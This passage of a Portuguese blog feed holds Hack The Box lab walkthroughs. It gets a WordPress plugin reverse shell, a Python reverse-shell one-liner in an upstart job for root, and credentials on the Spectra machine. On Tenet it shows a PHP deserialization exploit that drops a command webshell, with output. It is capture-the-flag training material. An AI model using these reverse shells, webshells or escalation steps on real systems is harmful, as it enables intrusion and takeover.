<p>Uma vez que o reuso de credenciais é algo bastante comum, tentei me autenticar no portal do Wordpress com a senha encontrada e o usuário previamente enumerado e tive o sucesso esperado!</p>

<p><img src="https://i.imgur.com/7k3nxVN.png" alt="HTB Spectra - Wordpress" class="align-center" /></p>

<h2 id="aceso-inicial">Aceso inicial</h2>

<p>Uma vez que temos acesso ao WordPress com privilégios administrativos, existem diversas maneiras de obter um shell reverso a partir destas permissões, sendo a forma mais comum o upload de um plugin malicioso que retornará um shell reverso para a máquina atacante.</p>

<p>Para esta finalidade existe um módulo do Metasploit Framework chamado <a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/unix/webapp/wp_admin_shell_upload.md">wp_admin_shell_upload</a>, que automatiza este processo de forma bem eficiente, porém, se estiver se preparando para a OSCP, que te limita a quantidade de vezes que pode utilizar o framework, para esta atividade simples isso não seria uma boa ideia :smile:.</p>

<p>Então, para criar este plugin, precisamos realizar os seguintes passos:</p>

<ul>
  <li>Criar um arquivo com o header do plugin. Este header tem que obedecer aos requisitos mínimos conforme documentado em <a href="https://developer.wordpress.org/plugins/plugin-basics/header-requirements/">Header Requirements | Plugin Developer Handbook | WordPress Developer Resources</a>. No nosso caso criei o arquivo <code class="language-plaintext highlighter-rouge">evilplugin.php</code> com o conteúdo listado abaixo.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cd">/**
 * Plugin Name: evilplugin
  * Version: 1.0
  * Author: evilauthor
  * Author URI: http://evilplugin.test.com
  * License: GPL2
  */</span>
</code></pre></div></div>

<ul>
  <li>Criar outro arquivo com o payload desejado. Neste caso como o objetivo é um shell reverso, fiz uma cópia do <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php reverse shell do Pentest Monkey</a>, alterei os detalhes deste e salvei como <code class="language-plaintext highlighter-rouge">exploit.php</code>. Abaixo evidencio o trecho do script que necessita alteração.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Usage</span>
<span class="c1">// -----</span>
<span class="c1">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span>
<span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">"1.0"</span><span class="p">;</span>
<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'10.10.10.10'</span><span class="p">;</span>  <span class="c1">// CHANGE THIS</span>
<span class="nv">$port</span> <span class="o">=</span> <span class="mi">4443</span><span class="p">;</span>       <span class="c1">// CHANGE THIS</span>
<span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
<span class="nv">$write_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
<span class="nv">$error_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
<span class="nv">$shell</span> <span class="o">=</span> <span class="s1">'uname -a; w; id; /bin/sh -i'</span><span class="p">;</span>
<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</code></pre></div></div>

<ul>
  <li>Compactar arquivo conforme abaixo</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>zip evilplugin.zip evilplugin.php exploit.php
  adding: evilplugin.php <span class="o">(</span>deflated 9%<span class="o">)</span>
  adding: exploit.php <span class="o">(</span>deflated 59%<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Uma vez criado o arquivo, acessar o portal do WordPress, autenticar com a conta administrativa e acessar, ao lado esquerdo, o menu <em>Plugins</em> &gt; <em>Add New</em> e, no topo, clicar no botão <em>Upload Plugin</em></li>
</ul>

<p><img src="https://i.imgur.com/UlBkZNE.png" alt="HTB Spectra - Upload evilplugin.zip" class="align-center" /></p>

<ul>
  <li>Inicializar o listener de acordo com o payload configurado. No nosso caso vamos iniciar o  netcat conforme linha de comando abaixo</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 4443
</code></pre></div></div>

<ul>
  <li>Selecionar o arquivo zip recém-criado e clicar no botão <em>Install Now</em></li>
</ul>

<p><img src="https://i.imgur.com/sNlvuWi.png" alt="HTB Spectra - Installed evilplugin.zip" class="align-center" /></p>

<ul>
  <li>Assim que o request for finalizado é importante fazer a requisição para o caminho dos arquivos em que o upload foi realizado. A linha de comando abaixo realiza o request usando <code class="language-plaintext highlighter-rouge">curl</code>, mas você pode deixar uma aba do browser preparada para realizar um GET nesta mesma URL</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-L</span> http://spectra.htb/main/wp-content/plugins/evilplugin/exploit.php
</code></pre></div></div>

<p>Após este procedimento, deveremos receber um shell reverso na máquina conforme abaixo: :smiley:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 4443
listening on <span class="o">[</span>any] 4443 ...
connect to <span class="o">[</span>10.10.10.10] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.229] 43298
Linux spectra 5.4.66+ <span class="c">#1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7401P 24-Core Processor AuthenticAMD GNU/Linux</span>
 08:41:48 up 4 min,  0 <span class="nb">users</span>,  load average: 0.26, 0.31, 0.17
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>20155<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20156<span class="o">(</span>nginx<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>20156<span class="o">(</span>nginx<span class="o">)</span>
nginx@spectra / <span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>20155<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20156<span class="o">(</span>nginx<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>20156<span class="o">(</span>nginx<span class="o">)</span>
nginx@spectra / <span class="err">$</span>
</code></pre></div></div>

<p class="notice--info">:bulb: <strong>Dica:</strong> Existem maneiras mais simples de alcançar este mesmo objetivo e ainda assim não utilizar o Metasploit. Uma ferramenta disponível no Github que pode auxiliar nesta tarefa é o <a href="https://github.com/n00py/WPForce">n00py/WPForce: Wordpress Attack Suite (github.com)</a>, que automatiza este e outros processos para exploração de websites em WordPress</p>

<h2 id="user-flag">User flag</h2>

<p>Após acesso inicial na máquina, iniciada enumeração utilizando o script <code class="language-plaintext highlighter-rouge">linpeas.sh</code>, onde pude revisar diversas informações, conforme listado abaixo:</p>

<ul>
  <li>
    <p>User: <strong>nginx</strong>, sem privilégios específicos (<code class="language-plaintext highlighter-rouge">uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)</code>)</p>
  </li>
  <li>
    <p>Sistema Operacional: <strong>Chromium OS 11</strong>.0_pre399094_p20200824-r6</p>
  </li>
  <li>
    <p>Publicação do conteúdo do nginx a partir do diretório <code class="language-plaintext highlighter-rouge">/usr/local/share/nginx/html</code> vide caminho dos arquivos <code class="language-plaintext highlighter-rouge">wp-config.php</code> onde as credenciais abaixo foram listadas:</p>

    <table>
      <thead>
        <tr>
          <th>site</th>
          <th>Username</th>
          <th>Password</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>main</td>
          <td>dev</td>
          <td>development01</td>
        </tr>
        <tr>
          <td>testing</td>
          <td>devtest</td>
          <td>devteam01</td>
        </tr>
      </tbody>
    </table>
  </li>
  <li>
    <p>Users com console, sendo possíveis caminhos de elevação de privilégio, assim como seus privilégios:</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Users with console
chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash
katie:x:20156:20157::/home/katie:/bin/bash
root:x:0:0:root:/root:/bin/bash

uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
uid=1001(chronos-access) gid=1001(chronos-access) groups=1001(chronos-access)
</code></pre></div></div>

<ul>
  <li>
    <p>MySQL  Ver 14.14 Distrib 5.7.20-19, for Linux (x86_64) using  6.3</p>
  </li>
  <li>
    <p>Possíveis chaves de SSH para máquina</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/chromeos-ssh-config/keys/authorized_keys
/usr/share/chromeos-ssh-config/keys/id_rsa
/usr/share/chromeos-ssh-config/keys/id_rsa.pub
</code></pre></div></div>

<ul>
  <li>Arquivos passwd incomuns, sendo um deles para <strong>autologin</strong> e com a senha <strong>SummerHereWeCome!!</strong> presente</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Searching uncommon passwd files (splunk)
passwd file: /etc/autologin/passwd
passwd file: /etc/pam.d/passwd
passwd file: /usr/share/baselayout/passwd

/etc/autologin/passwd
-rw-r--r-- 1 root root 19 Feb  3 16:43 /etc/autologin/passwd
SummerHereWeCome!!
</code></pre></div></div>

<ul>
  <li>Arquivo <code class="language-plaintext highlighter-rouge">user.txt</code> no home path da usuária <strong>katie</strong>, enumerado manualmente no que poderia ser visto no diretório de cada um dos usuários logados</li>
</ul>

<p>Uma vez que encontramos algumas senhas, um usuário inclusive que já tínhamos conhecimento vide enumeração via HTTP, decidi testá-las para os usuários <code class="language-plaintext highlighter-rouge">katie</code> e <code class="language-plaintext highlighter-rouge">chronos</code>, tendo sucesso com a seguinte combinação: <strong>katie:SummerHereWeCome!!</strong></p>

<p>Com acesso neste perfil realizado leitura da flag presente em seu home directory</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>katie@spectra ~ <span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>20156<span class="o">(</span>katie<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>20157<span class="o">(</span>katie<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>20157<span class="o">(</span>katie<span class="o">)</span>,20158<span class="o">(</span>developers<span class="o">)</span>
katie@spectra ~ <span class="nv">$ </span><span class="nb">cat </span>user.txt
e89d27fe195e9114ffa72ba8913a6130
katie@spectra ~ <span class="err">$</span>
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<p>já que temos a senha da usuária katie, a primeira coisa a fazer, já que temos sua senha, é verificar se ela possui algum privilégio de sudo, o qual retornou a seguinte entrada</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>katie@spectra ~ <span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
User katie may run the following commands on spectra:
    <span class="o">(</span>ALL<span class="o">)</span> SETENV: NOPASSWD: /sbin/initctl
katie@spectra ~ <span class="err">$</span>
</code></pre></div></div>

<p>Analisando o binário, o mesmo pode ser utilizado para o controle de jobs na máquina, vide execução do comando abaixo, porém precisaremos acesso para alteração de algum desses jobs de inicialização</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>katie@spectra ~ <span class="nv">$ </span>/sbin/initctl <span class="nb">help
</span>Job commands:
  start                       Start job.
  stop                        Stop job.
  restart                     Restart job.
  reload                      Send HUP signal to job.
  status                      Query status of job.
  list                        List known jobs.

Event commands:
  emit                        Emit an event.

Other commands:
  reload-configuration        Reload the configuration of the init daemon.
  version                     Request the version of the init daemon.
  log-priority                Change the minimum priority of log messages from the init daemon
  show-config                 Show emits, start on and stop on details <span class="k">for </span>job configurations.
  <span class="nb">help                        </span>display list of commands
</code></pre></div></div>

<p>Uma vez que a usuária katie é membro do grupo <strong>developers</strong>, decidi buscar por arquivos que este grupo tenha privilégio com base na execução abaixo, aonde foram retornados alguns arquivos na pasta <code class="language-plaintext highlighter-rouge">/etc/init</code> e que eram listados como jobs pelo <code class="language-plaintext highlighter-rouge">initctl</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>katie@spectra ~ <span class="nv">$ </span>find / <span class="nt">-group</span> developers 2&gt;/dev/null
/etc/init/test6.conf
/etc/init/test7.conf
/etc/init/test3.conf
/etc/init/test4.conf
/etc/init/test.conf
/etc/init/test8.conf
/etc/init/test9.conf
/etc/init/test10.conf
/etc/init/test2.conf
/etc/init/test5.conf
/etc/init/test1.conf
/srv
/srv/nodetest.js
katie@spectra ~ <span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/init/test<span class="k">*</span>
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test.conf
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test1.conf
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test10.conf
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test2.conf
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test3.conf
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test4.conf
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test5.conf
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test6.conf
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test7.conf
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test8.conf
<span class="nt">-rw-rw----</span> 1 root developers 478 Jun 29  2020 /etc/init/test9.conf
</code></pre></div></div>

<p>Para obter acesso de root, bastou alterar o job executado por um destes arquivos para iniciar um shell reverso para a máquina atacante com acesso privilegiado e assim, obter a flag de root.</p>

<p>Neste caso escolhi o arquivo <code class="language-plaintext highlighter-rouge">/etc/init/test10.conf</code>, que possuía o conteúdo abaixo e alterei apenas a sua seção script, conforme segundo bloco abaixo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>katie@spectra ~ <span class="nv">$ </span><span class="nb">cat</span> /etc/init/test10.conf
description <span class="s2">"Test node.js server"</span>
author      <span class="s2">"katie"</span>

start on filesystem or runlevel <span class="o">[</span>2345]
stop on shutdown

script

    <span class="nb">export </span><span class="nv">HOME</span><span class="o">=</span><span class="s2">"/srv"</span>
    <span class="nb">echo</span> <span class="nv">$$</span> <span class="o">&gt;</span> /var/run/nodetest.pid
    <span class="nb">exec</span> /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Edited portion</span>
script
  python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
end script
</code></pre></div></div>

<p>Após edição do arquivo, iniciado listener e executado o comando abaixo com a conta de katie, obtendo o shell reverso e flag</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># At Spectra as Kali</span>
katie@spectra /etc/init <span class="nv">$ </span><span class="nb">sudo</span> /sbin/initctl stop test10
initctl: Unknown instance:
katie@spectra /etc/init <span class="nv">$ </span><span class="nb">sudo</span> /sbin/initctl start test10
test10 start/running, process 4947
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># At attacker machine</span>
<span class="nv">$ </span>nc <span class="nt">-lnvp</span> 4443
listening on <span class="o">[</span>any] 4443 ...
connect to <span class="o">[</span>10.10.10.10] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.229] 33606
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="c"># whoami</span>
root
<span class="c"># cat /root/root.txt</span>
&lt;redacted&gt;
</code></pre></div></div>

<p>Espero que tenham gostado!</p>

<p>Vejo vocês no próximo post :smiley:</p>]]></content><author><name>Davi Cruz</name></author><category term="Walkthrough" /><category term="HackTheBox" /><category term="HTB Easy" /><category term="HTB Linux" /><summary type="html"><![CDATA[Olá pessoal! A máquina desta semana será Spectra, outra máquina Linux classificada como fácil do Hack The Box, criada por egre55.]]></summary></entry><entry><title type="html">Walktrough: HTB Tenet</title><link href="https://davicruz.com/walkthrough/2021/06/htb-tenet" rel="alternate" type="text/html" title="Walktrough: HTB Tenet" /><published>2021-06-12T13:00:00-03:00</published><updated>2021-06-12T13:00:00-03:00</updated><id>https://davicruz.com/walkthrough/2021/06/htb-tenet</id><content type="html" xml:base="https://davicruz.com/walkthrough/2021/06/htb-tenet"><![CDATA[<p>Olá pessoal!</p>

<p>A máquina desta semana será <strong>Tenet</strong>, outra máquina Linux classificada como mediana do <a href="https://www.hackthebox.eu/">Hack The Box</a>, criada por <a href="https://app.hackthebox.eu/users/94858">egotisticalSW</a>.<!--more--></p>

<p class="notice--info">:information_source: <strong>Info</strong>: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas.</p>

<p><img src="https://i.imgur.com/vouXrOD.png" alt="HTB Tenet" class="align-center" /></p>

<p>Antes de iniciar a resolução desta máquina, me chamou atenção a ilustração, a qual busquei e acabei encontrando sobre o quadrado Sator, onde temos um palíndromo com cinco palavras latinas: <em>SATOR</em>, <em>AREPO</em>, <em>TENET</em>, <em>OPERA</em> e <em>ROTAS</em>, que em um conjunto formam um quadrado com as mesmas palavras sendo TENET a central. Muito possivelmente estas palavras poderão estar presentes em algum ponto da resolução desta máquina :smile:.</p>

<h2 id="enumeração">Enumeração</h2>

<p>Como de costume, iniciado com um quick scan <code class="language-plaintext highlighter-rouge">nmap</code> para identificar os serviços publicados</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.223
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-02-27 14:36 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.223
Host is up <span class="o">(</span>0.079s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 <span class="o">(</span>RSA<span class="o">)</span>
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>18.06 seconds
</code></pre></div></div>

<h3 id="80tcp---serviço-http">80/TCP - Serviço HTTP</h3>

<p>Ao acessar esta página, notado que se trata da página default do Apache, logo iniciei uma enumeração de diretórios com o <code class="language-plaintext highlighter-rouge">gobuster</code> onde acabei encontrando alguns diretórios, dentre ele o <strong>wordpress</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.10.10.223/ <span class="nt">-o</span> gobuster.txt <span class="nt">-x</span> php,txt,html
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://10.10.10.223/
<span class="o">[</span>+] Threads:        10
<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Extensions:     php,txt,html
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2021/02/27 14:44:51 Starting gobuster
<span class="o">===============================================================</span>
/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
/users.txt <span class="o">(</span>Status: 200<span class="o">)</span>
/wordpress <span class="o">(</span>Status: 301<span class="o">)</span>
Progress: 5055 / 220561 <span class="o">(</span>2.29%<span class="o">)</span>^C
<span class="o">[!]</span> Keyboard interrupt detected, terminating.
<span class="o">===============================================================</span>
2021/02/27 14:48:08 Finished
<span class="o">===============================================================</span>
</code></pre></div></div>

<p>Ao acessá-lo, notado que a página estava sem formatação, logo validando o código fonte vi que estava com os apontamentos para as imagens em <strong>tenet.htb</strong>, o qual foi adicionado no <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>

<p>Após ajustado o dns, executado scan utilizando o <code class="language-plaintext highlighter-rouge">wpscan</code>, onde foi possível enumerar a versão do Wordpress, no caso 5.6, e usuários <strong>protagonist</strong> e <strong>neil</strong></p>

<p>Como ao acessar a página pela url <code class="language-plaintext highlighter-rouge">http://10.10.10.223/wordpress</code> informa uma mensagem de erro, conforme imagem abaixo. Acessando a partir do dns configurado e conforme visto no codigo fonte (<code class="language-plaintext highlighter-rouge">http://tenet.htb</code>) para visualizar o site wordpress corretamente.</p>

<p><img src="https://i.imgur.com/7fwmYW7.png" alt="HTB Tenet - 80/TCP" class="align-center" /></p>

<p>Analisando as postagens ao acessar o wordpress pelo DNS, notei que os posts mencionam um sistema chamado <strong>Rotas</strong>, que possivelmente possa conter algum item a ser explorado e conseguir um acesso inicial</p>

<blockquote>
  <p>This Is Where Our Worlds Collide
We’re looking for beta testers of our new time-management software, ‘Rotas’
‘Rotas’ will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you! For more information regarding opting-in, watch this space.</p>
</blockquote>

<p>As coisas ficam mais interessantes em um post mais antigo, onde o usuário <code class="language-plaintext highlighter-rouge">neil</code> comenta o seguinte na postagem:</p>

<blockquote>
  <p>did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!</p>
</blockquote>

<p>Buscando por <code class="language-plaintext highlighter-rouge">sator.php</code> no hostname <code class="language-plaintext highlighter-rouge">tenet.htb</code> não retornou nada, mas acessando diretamente ao IP do servidor, conforme acessado inicialmente, recebi a página abaixo:</p>

<p><img src="https://i.imgur.com/46AX0aF.png" alt="HTB Tenet - sator.php" class="align-center" /></p>

<p>Uma vez que backups são criados com sufixos <code class="language-plaintext highlighter-rouge">old</code> ou <code class="language-plaintext highlighter-rouge">bak</code>, acabei encontrando o arquivo <code class="language-plaintext highlighter-rouge">sator.php.bak</code> no mesmo diretório, onde pude listar o conteúdo abaixo:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="kd">class</span> <span class="nc">DatabaseExport</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'users.txt'</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
    
    <span class="k">public</span> <span class="k">function</span> <span class="n">update_db</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'[+] Grabbing users from text file &lt;br&gt;'</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span> <span class="n">data</span> <span class="o">=</span> <span class="s1">'Success'</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/'</span> <span class="mf">.</span> <span class="nv">$this</span> <span class="o">-&gt;</span><span class="n">user_file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
        <span class="k">echo</span> <span class="s1">'[] Database updated &lt;br&gt;'</span><span class="p">;</span>
        <span class="c1">//    echo 'Gotta get this working properly...';</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'arepo'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$databaseupdate</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>

<span class="nv">$app</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DatabaseExport</span><span class="p">;</span>
<span class="nv">$app</span> <span class="o">-&gt;</span> <span class="nf">update_db</span><span class="p">();</span>

<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>Como podemos ver este código é vulnerável a <strong>PHP Deserialization</strong>, uma vez que não valida o input recebido via GET a partir do query string arg <strong>arepo</strong>, permitindo que seja modificado o conteúdo do arquivo de banco de dados.</p>

<h2 id="acesso-inicial">Acesso inicial</h2>

<p>Para acesso inicial o primeiro passo é criar um dado serializado do PHP malicioso e enviar no argumento <strong>arepo</strong> conforme vimos no metodo get. Buscando um pouco encontrei <a href="https://github.com/1N3/Exploits/blob/master/PHP-Serialization-RCE-Exploit.php">este exemplo de exploit</a> que foi modificado para gerar um webshell simples na máquina, o qual poderia a posteriori ser utilizado para obter um shell reverso na máquina.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 

<span class="kd">class</span> <span class="nc">DatabaseExport</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'shell.php'</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">'&lt;?php system($_GET["cmd"]); ?&gt;'</span><span class="p">;</span>
    
    <span class="k">public</span> <span class="k">function</span> <span class="n">update_db</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'[+] Grabbing users from text file &lt;br&gt;'</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span> <span class="n">data</span> <span class="o">=</span> <span class="s1">'Success'</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/'</span> <span class="mf">.</span> <span class="nv">$this</span> <span class="o">-&gt;</span><span class="n">user_file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
        <span class="k">echo</span> <span class="s1">'[] Database updated &lt;br&gt;'</span><span class="p">;</span>
        <span class="c1">//    echo 'Gotta get this working properly...';</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$url</span> <span class="o">=</span> <span class="s1">'http://10.10.10.223/sator.php?arepo='</span><span class="p">;</span>
<span class="nv">$arepo</span> <span class="o">=</span> <span class="nv">$url</span> <span class="mf">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nc">DatabaseExport</span><span class="p">));</span>
<span class="nv">$response</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"</span><span class="nv">$arepo</span><span class="s2">"</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">"</span><span class="nv">$response</span><span class="s2">"</span><span class="p">;</span>
</code></pre></div></div>

<p>Após execução, foi possível validar o funcionamento do webshell com a chamada executando o comando <code class="language-plaintext highlighter-rouge">id</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>php exploit.php
<span class="o">[]</span> Database updated &lt;br&gt;[+] Grabbing <span class="nb">users </span>from text file &lt;br&gt;
<span class="o">[]</span> Database updated &lt;br&gt;[] Database updated &lt;br&gt;   

<span class="nv">$ </span>curl <span class="nt">-L</span> http://10.10.10.223/shell.php?cmd<span class="o">=</span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div>

